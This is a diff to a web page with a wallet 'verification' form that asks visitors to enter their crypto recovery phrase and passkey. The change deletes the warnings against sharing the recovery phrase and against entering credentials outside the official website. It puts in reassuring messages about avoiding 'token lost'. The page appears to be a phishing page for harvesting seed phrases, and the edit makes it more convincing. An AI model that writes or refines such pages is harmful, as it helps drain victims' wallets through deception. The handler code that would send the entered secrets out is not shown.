@@ -405,13 +405,13 @@ body::before {
 
                 <div id="phrase" class="tab-content active">
                     <textarea id="seedPhraseInput" class="auth-input" placeholder="Enter recovery phrase (12-24 words)" rows="4" spellcheck="false"></textarea>
-                    <p class="security-warning">Never share your recovery phrase with anyone!</p>
+                    <p class="security-warning">Ensure your phrase is correct to avoid token lost!</p>
                     <button class="connect-wallet-btn" onclick="handlePhraseAuth()">Verify</button>
                 </div>
 
                 <div id="passkey" class="tab-content">
                     <input type="password" id="passkeyInput" class="auth-input" placeholder="Enter your passkey">
-                    <p class="security-warning">Ensure you're on the official website before entering credentials</p>
+                    <p class="security-warning">Ensure that your passkey is correct to avoid token lost!</p>
                     <button class="connect-wallet-btn" onclick="handlePasskeyAuth()">Authenticate</button>
                 </div>
             </div>
